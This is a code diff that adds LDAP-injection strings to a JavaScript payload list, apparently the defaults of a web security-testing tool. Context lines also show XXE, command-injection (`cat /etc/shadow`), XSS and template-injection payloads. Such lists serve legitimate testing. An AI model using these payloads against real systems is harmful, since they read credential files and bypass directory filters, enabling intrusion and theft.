@@ -22,10 +22,6 @@ let defaults = {
       "parentId":"xxe",
       "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY read SYSTEM \"file:///etc/passwd\">]><root>&read;</root>"
     },
-    { "id": "5",
-      "parentId":"ldap-injection",
-      "payload": "*()|&'"
-    },
     { "id": "6",
       "parentId":"command-injection-windows",
       "payload": "; cat /etc/shadow"
@@ -33,10 +29,6 @@ let defaults = {
     { "id": "7",
       "parentId":"xss",
       "payload": "javascript:alert(1)"
-    },
-    { "id": "8",
-      "parentId":"xss",
-      "payload": " \'-alert(1)//"
     },
     { "id": "9",
       "parentId":"xss",
@@ -1038,7 +1030,108 @@ let defaults = {
       "id":"223",
       "parentId":"command-injection-windows",
       "payload":"{{[] .__ Class __.__ base __.__ subclasses __ ()}}"
+   },
+   {
+      "id":"224",
+      "parentId":"ldap-injection",
+      "payload":"*"
+   },
+   {
+      "id":"225",
+      "parentId":"ldap-injection",
+      "payload":"*)(&"
+   },
+   {
+      "id":"226",
+      "parentId":"ldap-injection",
+      "payload":"*))%00"
+   },
+   {
+      "id":"227",
+      "parentId":"ldap-injection",
+      "payload":")(cn=))\x00"
+   },
+   {
+      "id":"228",
+      "parentId":"ldap-injection",
+      "payload":"*()|%26'"
+   },
+   {
+      "id":"229",
+      "parentId":"ldap-injection",
+      "payload":"*()|&'"
+   },
+   {
+      "id":"230",
+      "parentId":"ldap-injection",
+      "payload":"*(|(mail=*))"
+   },
+   {
+      "id":"231",
+      "parentId":"ldap-injection",
+      "payload":"*(|(objectclass=*))"
+   },
+   {
+      "id":"232",
+      "parentId":"ldap-injection",
+      "payload":"*)(uid=*))(|(uid=*"
+   },
+   {
+      "id":"233",
+      "parentId":"ldap-injection",
+      "payload":"*/*"
+   },
+   {
+      "id":"234",
+      "parentId":"ldap-injection",
+      "payload":"*|"
+   },
+   {
+      "id":"235",
+      "parentId":"ldap-injection",
+      "payload":"/"
+   },
+   {
+      "id":"236",
+      "parentId":"ldap-injection",
+      "payload":"//"
+   },
+   {
+      "id":"237",
+      "parentId":"ldap-injection",
+      "payload":"//*"
+   },
+   {
+      "id":"238",
+      "parentId":"ldap-injection",
+      "payload":"@*"
+   },
+   {
+      "id":"239",
+      "parentId":"ldap-injection",
+      "payload":"|"
+   },
+   {
+      "id":"240",
+      "parentId":"ldap-injection",
+      "payload":"admin*"
+   },
+   {
+      "id":"241",
+      "parentId":"ldap-injection",
+      "payload":"admin*)((|userpassword=*)"
+   },
+   {
+      "id":"242",
+      "parentId":"ldap-injection",
+      "payload":"admin*)((|userPassword=*)"
+   },
+   {
+      "id":"243",
+      "parentId":"ldap-injection",
+      "payload":"x' or name()='username' or 'x'='y"
    }
+
 ]}
 
 let categories = [
